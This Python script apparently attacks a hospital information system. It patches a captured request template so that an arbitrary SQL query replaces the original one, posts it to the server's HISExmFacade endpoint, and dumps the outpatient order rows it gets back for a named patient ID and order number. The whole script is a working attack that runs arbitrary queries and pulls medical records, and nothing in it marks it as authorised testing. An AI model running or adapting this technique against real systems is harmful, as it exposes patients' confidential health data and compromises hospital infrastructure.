from his_client_final import HISClient
import sys, re

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()
target_hhistnum = "003086248H" 
target_ordseq = "E46807442OR0019"

print(f"[*] Inspecting ORDOP for {target_ordseq}...")

# Use EXM SQL to query OPDORDM directly by ORDSEQ (since ORDOP failed)
sql = f"SELECT * FROM OPDUSR.OPDORDM WHERE ORDSEQ = '{target_ordseq}'"

def execute_sql(sql_query):
    import zlib, os, requests
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return None
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=zlib.compress(patched_payload), headers=c.headers)
    if resp.status_code == 200:
        return zlib.decompress(resp.content).decode('utf-8', errors='ignore')
    return None

res = execute_sql(sql)
if res and "<NewDataSet>" in res:
    # Extract rows
    import re
    # The rows might be named DRMODIFY or Table or something else depending on the template used.
    # The output from previous step showed <xs:element name="DRMODIFY">, so rows should be <DRMODIFY>
    rows = re.findall(r'<DRMODIFY[^>]*>(.*?)</DRMODIFY>', res, re.DOTALL)
    print(f"[+] Found {len(rows)} rows in OPDORDM.")
    for i, row in enumerate(rows):
        print(f"\n--- Row {i} ---")
        fields = re.findall(r'<(\w+)>(.*?)</\1>', row)
        for k, v in fields:
            print(f"{k}: {v}")
else:
    print("[-] No NewDataSet found or empty response.")
    print(res[:2000]) # Print more raw if failed
